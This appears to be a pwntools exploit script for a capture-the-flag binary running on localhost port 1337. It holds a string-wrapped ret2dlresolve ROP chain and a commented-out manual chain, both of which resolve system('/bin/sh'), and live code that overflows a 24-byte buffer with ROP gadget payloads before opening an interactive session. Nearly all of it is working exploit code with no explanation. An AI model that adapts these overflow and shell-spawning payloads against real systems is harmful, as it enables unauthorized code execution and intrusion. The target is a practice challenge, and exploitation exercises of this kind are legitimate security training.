from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004011d8
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
'''
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh', 0, 0])

rop.raw('A' * 24)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

sl(rop.chain())
pause()
sl(dlresolve.payload) '''

# pop_rdi = 0x401293
# pop_rsi_r15 = 0x401291
# pop_rdx = 0x4011e2
# sys = 0x401020

# payload = b'a'*24
# payload += p64(pop_rdi)
# payload += p64(0)
# payload += p64(pop_rsi_r15)
# payload += p64(0x404e00)
# payload += p64(0)
# payload += p64(elf.plt['read'])
# payload += p64(pop_rdi)
# payload += p64(0x404e38)
# payload += p64(pop_rsi_r15)
# payload += p64(0)
# payload += p64(0)
# payload += p64(pop_rdx)
# payload += p64(0)
# payload += p64(sys)
# payload += p64(0x307)

# sl(payload)
# pause()
# payload2 = b'system\x00a\x08Y'
# payload2 += b'\x00'*22
# payload2 += p64(0x404e00)
# payload2 += p32(0x7)
# payload2 += p32(0x3be)
# payload2 += p64(0)
# payload2 += b'/bin/sh\x00'
# sl(payload2)

ret = 0x000000000040101a
pop_r15 = 0x401292


payload = b'a'*24
# payload += p64(ret)
payload += p64(0x000000000040128b)
# payload += p64(elf.sym['main'])
sl(payload)

pause()

payload2 = b'a'*16
payload2 += p64(0x1)
payload2 += p64(pop_r15)
payload2 += p64(0x0000000000403dc0)
payload2 += p64(0x0000000000401267)
sl(payload2)
io.interactive()
